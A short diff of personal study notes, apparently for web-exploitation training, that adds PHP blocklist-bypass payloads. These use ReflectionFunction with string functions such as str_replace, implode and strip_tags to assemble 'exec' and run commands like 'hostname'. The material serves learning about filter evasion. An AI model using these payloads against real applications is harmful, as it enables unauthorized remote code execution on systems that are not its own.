@@ -198,7 +198,8 @@ haxhaxhax
    	4. "extends CommonObject" in code-server's search bar can get other classes inherit from CommonObject.
     	5. Filter Bypass Revisted - Review other ways to bypass blocklist validation controls.
     	6. reflection -> to a way to modify an application programmatically at run-time. Example like (new ReflectionFunction(urldecode('%65%78%65%63')))->invoke('whoami');
-    	7. 
+    	7. PHP includes many string functions that we could use in our payload to bypass the blocklist. We could use string functions to construct "exec" in a variety of ways.
+    	8. a. (new ReflectionFunction(str_replace("z", "e","zxzc")))->invoke('hostname'); b. (new ReflectionFunction(implode("x", array("e","ec"))))->invoke('hostname'); c. (new ReflectionFunction(strip_tags("ex<a>ec")))->invoke('hostname'); 
  
 14.  (Archived)Atmail Mail Server Appliance: from XSS to RCE archived
 	1. test
